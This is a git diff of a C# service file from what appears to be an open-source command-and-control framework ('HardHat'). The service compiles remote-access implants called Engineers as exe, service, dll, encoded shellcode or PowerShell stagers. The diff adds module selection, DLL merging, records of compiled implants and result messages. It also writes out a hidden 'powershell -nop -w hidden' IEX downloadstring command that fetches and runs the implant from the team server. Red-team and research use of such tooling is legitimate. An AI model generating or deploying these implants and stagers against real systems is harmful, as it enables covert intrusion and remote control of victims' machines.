@@ -1,52 +1,52 @@
-﻿using System;
+﻿using ApiModels.Requests;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Threading;
-using System.Threading.Tasks;
-using ApiModels.Requests;
 using TeamServer.Models;
 using TeamServer.Models.Extras;
 using TeamServer.Models.Managers;
 using TeamServer.Utilities;
+using Microsoft.AspNetCore.Mvc;
 
 namespace TeamServer.Services
 {
-	public interface IEngineerService
-	{
-		void AddEngineer(Engineer Engineer);
-		IEnumerable<Engineer> GetEngineers();
-		Engineer GetEngineer(string id);
-		void RemoveEngineer(Engineer Engineer);
-	}
+    public interface IEngineerService
+    {
+        void AddEngineer(Engineer Engineer);
+        IEnumerable<Engineer> GetEngineers();
+        Engineer GetEngineer(string id);
+        void RemoveEngineer(Engineer Engineer);
+    }
 
-	public class EngineerService : IEngineerService
-	{
-		public static readonly List<Engineer> _engineers = new(); //readonly works here because a list is ref type, works even if the data type i nthe list if value type like a list of ints.
-															// so I also cant make a new list and try and assin it to this one I can only mess with this list instance not replace it.
+    public class EngineerService : IEngineerService
+    {
+        public static readonly List<Engineer> _engineers = new();
 
-		public void AddEngineer(Engineer Engineer)
-		{
-			_engineers.Add(Engineer);
-		}
-		public IEnumerable<Engineer> GetEngineers()
-		{
-			return _engineers;
-		}
-		public Engineer GetEngineer(string id)
-		{
-			return GetEngineers().FirstOrDefault(a => a.engineerMetadata.Id.Equals(id));
-		}
-		public void RemoveEngineer(Engineer Engineer)
-		{
-			_engineers.Remove(Engineer);
-		}
+        public void AddEngineer(Engineer Engineer)
+        {
+            _engineers.Add(Engineer);
+        }
+        public IEnumerable<Engineer> GetEngineers()
+        {
+            return _engineers;
+        }
+        public Engineer GetEngineer(string id)
+        {
+            return GetEngineers().FirstOrDefault(a => a.engineerMetadata.Id.Equals(id));
+        }
+        public void RemoveEngineer(Engineer Engineer)
+        {
+            _engineers.Remove(Engineer);
+        }
 
-		public static bool CreateEngineers(SpawnEngineerRequest request)
-		{
-			{
+        public static bool CreateEngineers(SpawnEngineerRequest request, out string result_message)
+
+        {
+            {
                 char allPlatformPathSeperator = Path.DirectorySeparatorChar;
                 // find the Engineer cs file and load it to a string so we can update it and then run the compiler function on it
                 string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
@@ -62,9 +62,9 @@ namespace TeamServer.Services
                 //usinf request.managerName to find the correct manager object and then get its BindAddress and BindPort from the manager object
                 //then using the BindAddress and BindPort to update the file
                 string managerName = request.managerName;
-                int connectionAttempts = request.ConnectionAttempts;
-                int sleep = request.Sleep;
-                SpawnEngineerRequest.SleepTypes sleepType = request.SleepType;
+                int connectionAttempts = (int)request.ConnectionAttempts;
+                int sleep = (int)request.Sleep;
+                SpawnEngineerRequest.SleepTypes sleepType = (SpawnEngineerRequest.SleepTypes)request.SleepType;
                 string managerBindAddress = "";
                 string managerBindPort = "";
                 string managerConnectionAddress = "";
@@ -188,10 +188,13 @@ namespace TeamServer.Services
                 }
 
                 //generate code for the implant
-                byte[] assemblyBytes = Utilities.Compile.GenerateCode(file, request.complieType, request.SleepType);
+                List<string> nonIncCommands = Directory.GetFiles(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Commands{allPlatformPathSeperator}", "*.cs").ToList().Where(x => !request.IncludedCommands.Contains(Path.GetFileNameWithoutExtension(x), StringComparer.CurrentCultureIgnoreCase)).ToList();
+                List<string> nonIncModules = Directory.GetFiles(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Modules{allPlatformPathSeperator}", "*.cs").ToList().Where(x => !request.IncludedModules.Contains(Path.GetFileNameWithoutExtension(x), StringComparer.CurrentCultureIgnoreCase)).ToList();
+                byte[] assemblyBytes = Utilities.Compile.GenerateEngCode(file, (SpawnEngineerRequest.EngCompileType)request.complieType, (SpawnEngineerRequest.SleepTypes)request.SleepType, nonIncCommands,nonIncModules);
                 if (assemblyBytes is null)
                 {
-                    return false;
+                    result_message = "Failed to compile Engineer, check teamServer Console for errors.";
+                    return false; 
                 }
 
                 try
@@ -235,23 +238,67 @@ namespace TeamServer.Services
                         System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                     }
 
-
+                    string TopLevelFolder = pathSplit[0] + $"..{allPlatformPathSeperator}"; //Main HardHat folder 
+                    string DynamicLoadingDllPath = TopLevelFolder + "DynamicEngLoading" + allPlatformPathSeperator + "bin" + allPlatformPathSeperator + "Debug" + allPlatformPathSeperator + "DynamicEngLoading.dll";
+                    //string DynamicLoadingDllPath = pathSplit[0] + "Data" + allPlatformPathSeperator + "DynamicEngLoading.dll";
                     var jsonFastLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}fastJSON.dll";
+
                     var searchDir = $"{pathSplit[0]}Data{allPlatformPathSeperator}";
 
-                    string[] assemblyArray = { sourceAssemblyLocation, jsonFastLocation };
+                    string[] assemblyArray = { sourceAssemblyLocation, jsonFastLocation, DynamicLoadingDllPath };
+                    if(request.IsPostEx)
+                    {
+                        outputLocation = outputLocation.Replace("Engineer", "PostExEngineer");
+                    }
                     Utilities.MergeAssembly.MergeAssemblies(outputLocation, assemblyArray, searchDir);
 
 
                     Console.WriteLine("Merged Engineer and needed dlls");
                     var updatedExe = System.IO.File.ReadAllBytes(outputLocation);
+                    //if file exists for delete it so write all bytes can work
+                    //GC.Collect();
+                    //GC.WaitForPendingFinalizers();
+                    ////make a copy of the engineer in the temp folder to use for some commands later
+                    //System.IO.File.WriteAllBytes(sourceAssemblyLocation, updatedExe);
                 }
                 catch (Exception ex)
                 {
                     Console.WriteLine(ex.Message);
                     Console.WriteLine(ex.StackTrace);
+                    result_message = "Merging of exe and needed dlls failed, check teamServer Console for errors.";
                     return false;
                 }
+
+                //create a CompiledImplant object to store the compiled implant
+                CompiledImplant _compImp = new()
+                {
+                    Id = Guid.NewGuid().ToString(),
+                    Name = $"Engineer_{managerName}",
+                    ImplantType = "Engineer",
+                    ManagerName = managerName,
+                    Sleep = request.Sleep.ToString(),
+                    SleepType = request.SleepType.ToString(),
+                    CompileType = request.complieType.ToString(),
+                    CompileDateTime = DateTime.UtcNow.ToString(),
+                    KillDateTime = request.KillDateTime.ToString(),
+                    IncludedCommands = request.IncludedCommands,
+                    IncludedModules = request.IncludedModules,
+                    ConnectionAttempts = request.ConnectionAttempts.ToString()
+                };
+                if(_compImp.CompileType == "Service")
+                {
+                    _compImp.SavedPath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}{_compImp.ImplantType}_{managerName}_Service.exe";
+                }
+                else if (_compImp.CompileType == "shellcode")
+                {
+                    _compImp.SavedPath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}{_compImp.ImplantType}_{managerName}_shellcode.bin";
+                }
+                else
+                {
+                    _compImp.SavedPath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}{_compImp.ImplantType}_{managerName}.{_compImp.CompileType}";
+                }
+
+                HardHatHub.AddCompiledImplant(_compImp);
 
                 if (request.complieType == SpawnEngineerRequest.EngCompileType.exe)
                 {
@@ -266,12 +313,14 @@ namespace TeamServer.Services
                         HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer compiled saved at {compiledEngLocation}", Status = "success" });
                         LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                         Thread.Sleep(10);
+                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                         return true;
                     }
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
                         Console.WriteLine(ex.StackTrace);
+                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe already exists.";
                         return false;
                     }
                 }
@@ -288,12 +337,14 @@ namespace TeamServer.Services
                         HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
                         LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                         Thread.Sleep(10);
+                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_Service.exe";
                         return true;
                     }
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
                         Console.WriteLine(ex.StackTrace);
+                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_Service.exe already exists.";
                         return false;
                     }
                 }
@@ -310,12 +361,14 @@ namespace TeamServer.Services
                         HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
                         LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
                         Thread.Sleep(10);
+                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
                         return true;
                     }
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
                         Console.WriteLine(ex.StackTrace);
+                        result_message = "Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll already exists.";
                         return false;
                     }
                 }
@@ -326,7 +379,7 @@ namespace TeamServer.Services
                         //call the shellcode utility giving it the path we just wrote this exe to then return the shellcode and write its content to a file 
                         var shellcodeLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                         var shellcode = Utilities.Shellcode.AssemToShellcode(shellcodeLocation, "");
-                        if (request.EncodeShellcode)
+                        if ((bool)request.EncodeShellcode)
                         {
                             var encoded_shellcode = Shellcode.EncodeShellcode(shellcode);
                             System.IO.File.WriteAllBytes(
@@ -345,13 +398,15 @@ namespace TeamServer.Services
                         HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer shellcode written to {shellLocation}", Status = "success" });
                         LoggingService.EventLogger.Information("Engineer shellcode written to {shellLocation}", shellLocation);
 
+                        result_message = "Shellcode file written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin";
                         return true;
                     }
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
                         Console.WriteLine(ex.StackTrace);
-                        return false;
+                        result_message = "Engineer shellcode " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.bin already exists.";
+                        return false; 
                     }
                 }
                 //if request.compileType is powershellcmd then convert the assemnbly bytes to a base64 string 
@@ -370,19 +425,22 @@ namespace TeamServer.Services
                         HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer powershell command written to {allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt", Status = "success" });
                         LoggingService.EventLogger.Information("Engineer powershell command written to {psCommandPath}", psCommandPath);
                         HardHatHub.AddPsCommand($"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('https://TeamserverIp:HttpManagerPort/Engineer_{managerName}_pscmd.txt'))\"");
+                        result_message = "Powershell command written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt";
                         return true;
                     }
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
                         Console.WriteLine(ex.StackTrace);
+                        result_message = "powershell cmd generation failed";
                         return false;
                     }
                 }
+                result_message = "Failed to compile Engineer, check teamServer Console for errors.";
                 return false;
 
             }
-		}
-		
-	}
+        }
+
+    }
 }
